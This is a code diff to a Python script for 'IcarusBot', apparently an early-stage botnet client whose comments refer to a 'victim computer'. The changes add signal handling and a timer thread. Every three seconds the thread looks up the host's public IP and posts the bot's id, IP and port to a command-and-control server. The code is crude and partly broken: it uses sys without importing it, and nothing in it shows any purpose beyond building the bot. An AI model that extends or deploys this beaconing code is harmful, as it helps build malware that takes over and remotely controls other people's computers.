@@ -1,6 +1,7 @@
 # Keen to start
 import requests
-import socket
+import socket, signal
+import threading
 import time
 from config import API_URL
 
@@ -10,7 +11,14 @@ class IcarusBot():
     """
     def __init__(self):
         self.bot_id = 1 # should be random or grabbed somehow from victim computer
+        signal.signal(signal.SIGINT, self.exit_gracefully)
+        signal.signal(signal.SIGTERM, self.exit_gracefully)
 
+
+    def exit_gracefully(self, signum, frame):
+        print("\Exiting...")
+        self.update_thread.cancel()
+        sys.exit(0)
 
     def lookup(self):
         """sends request to nameserver to get command ip and port"""
@@ -22,17 +30,17 @@ class IcarusBot():
     
     def update(self):
         """updates nameserver with ip and port"""
+        self.update_thread = threading.Timer(3.0, self.update)
+        self.update_thread.start()
         ip = requests.get('https://api.ipify.org').content.decode('utf8')
         # setting up sockets required for port?
         payload = {'id':self.bot_id,'ip':ip,'port':25565}
         # unsure if get or post request!
-        r = requests.post(f'{API_URL}/bot/update', payload=payload)
+        r = requests.post(f'{API_URL}/bot/update', data=payload)
+        print('updating')
 
     def start(self):
-        while True:
-            self.lookup()
-            self.update()
-            time.sleep(5) # obviously we will be threading and shit later
+        self.update()
 
 def main():
     bot = IcarusBot()
